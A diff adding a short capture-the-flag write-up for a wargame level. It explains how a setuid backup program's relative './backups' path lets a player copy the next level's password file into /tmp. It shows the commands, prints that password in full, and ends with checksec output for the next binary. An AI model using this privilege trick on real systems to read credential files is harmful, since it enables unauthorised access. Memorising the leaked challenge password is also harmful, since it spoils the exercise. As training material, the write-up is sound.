@@ -1,0 +1,20 @@
+$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+The problem is fopen uses mode, which open the file exclusively
+If the file already exists, fopen() fails
+
+Program use not the absolute path, but relative "./backups", thus we can simply run it from another folder.
+In /home/users/level08/backups folder we do not have write permissions, but we do have them in /tmp
+
+$ mkdir -p /tmp/backups/home/users/level09 && cd /tmp
+
+$ /home/users/level08/level08 /home/users/level09/.pass 
+
+$ cat /tmp/backups/home/users/level09.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+$ su level09
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
